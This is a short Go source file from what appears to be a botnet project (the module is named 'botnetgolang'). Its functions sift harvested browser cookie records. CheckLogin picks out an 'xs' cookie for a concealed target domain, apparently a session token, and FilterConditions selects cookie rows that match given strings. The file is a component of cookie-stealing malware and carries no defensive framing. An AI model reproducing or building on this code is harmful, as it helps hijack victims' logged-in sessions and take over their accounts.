package pkg

import (
	_const "botnetgolang/internal/const"
	"fmt"
	"strings"
)

func CheckLogin(cookie []map[string]interface{}) interface{} {
	for _, row := range cookie {
		value, ok := row["host_key"].(string)
		if !ok {
			continue
		}
		if row["name"] == "xs" && strings.Contains(value, _const.Cfff) {
			return row

		}
	}
	return nil
}

func FilterConditions(cookie []map[string]interface{}, conditions []interface{}, target string) []map[string]interface{} {
	var results []map[string]interface{}

	for _, row := range cookie {
		for _, condition := range conditions {
			if strings.Contains(fmt.Sprintf("%v", row[target]), fmt.Sprintf("%v", condition)) {
				results = append(results, row)
				break
			}
		}

	}
	return results
}
